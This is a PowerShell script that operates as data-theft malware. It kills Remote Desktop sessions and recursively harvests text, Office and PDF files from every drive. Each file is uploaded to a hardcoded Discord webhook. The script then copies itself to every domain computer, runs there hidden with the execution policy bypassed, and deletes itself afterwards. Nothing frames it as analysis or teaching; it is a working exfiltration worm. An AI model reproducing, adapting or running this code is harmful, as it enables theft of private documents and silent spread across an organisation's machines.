# Function to close any active Remote Desktop connections
function Close-RemoteDesktopConnections {
    $rdpProcesses = Get-Process -Name mstsc -ErrorAction SilentlyContinue
    foreach ($process in $rdpProcesses) {
        Stop-Process -Id $process.Id -Force
    }
}

# Function to upload file to Discord webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath,
        [string]$webhookUrl
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

    # Create multipart/form-data content
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Convert]::ToBase64String($fileBytes),
        "--$boundary--"
    )
    $body = $bodyLines -join $LF
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)

    # Send the request
    $webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
    $webRequest.ContentLength = $bytes.Length
    $webRequestStream = $webRequest.GetRequestStream()
    $webRequestStream.Write($bytes, 0, $bytes.Length)
    $webRequestStream.Close()

    # Get the response from the server
    $webResponse = $webRequest.GetResponse()
    $webResponseStream = $webResponse.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($webResponseStream)
    $responseContent = $reader.ReadToEnd()
    $reader.Close()
    $webResponseStream.Close()
    $webResponse.Close()
}

# Function to replicate the script to other computers and execute it
function Replicate-Script {
    param (
        [string]$scriptPath,
        [string]$webhookUrl
    )

    # Get all computers in the domain
    $computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
    foreach ($computer in $computers) {
        try {
            # Copy the script to the target computer
            Copy-Item -Path $scriptPath -Destination "\\$computer\C$\Windows\Temp\" -Force

            # Execute the script on the target computer
            Invoke-Command -ComputerName $computer -ScriptBlock {
                param ($scriptPath, $webhookUrl)
                powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath
            } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl -Credential (Get-Credential)
        } catch {
            Write-Host "Failed to replicate or execute on $computer: $_"
        }
    }
}

# Close any active Remote Desktop connections
Close-RemoteDesktopConnections

# Recursively get txt, xlsx, pdf, and doc files from all drives in rotation
$webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
$fileTypes = @("*.txt", "*.xlsx", "*.pdf", "*.doc", "*.docx")
$drives = Get-PSDrive -PSProvider FileSystem

foreach ($drive in $drives) {
    foreach ($fileType in $fileTypes) {
        Get-ChildItem -Path $drive.Root -Filter $fileType -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            Upload-FileToDiscord -filePath $_.FullName -webhookUrl $webhookUrl
        }
    }
}

# Replicate the script to other computers
Replicate-Script -scriptPath $MyInvocation.MyCommand.Definition -webhookUrl $webhookUrl

# Remove the PowerShell script file after execution
$scriptPath = $MyInvocation.MyCommand.Definition
Remove-Item -Path $scriptPath -Force
